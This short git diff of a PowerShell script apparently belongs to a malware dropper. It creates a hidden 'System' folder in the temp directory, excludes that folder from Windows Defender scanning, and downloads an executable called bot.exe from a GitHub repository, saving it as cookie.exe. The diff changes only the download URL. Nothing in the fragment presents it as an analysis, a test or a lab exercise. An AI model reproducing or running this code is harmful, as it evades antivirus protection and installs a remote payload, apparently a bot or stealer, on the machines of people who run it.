@@ -3,7 +3,7 @@ $systemPath = [System.IO.Path]::Combine($env:temp, "System")
 New-Item -Path $systemPath -ItemType Directory -Force
 Add-MpPreference -ExclusionPath $systemPath
 
-$cookieUrl = "https://raw.githubusercontent.com/blackcode2290/test/main/bot.exe"
+$cookieUrl = "https://github.com/blackcode2290/test/raw/refs/heads/main/bot.exe"
 $cookiePath = [System.IO.Path]::Combine($systemPath, "cookie.exe")
 
 Invoke-WebRequest -Uri $cookieUrl -OutFile $cookiePath
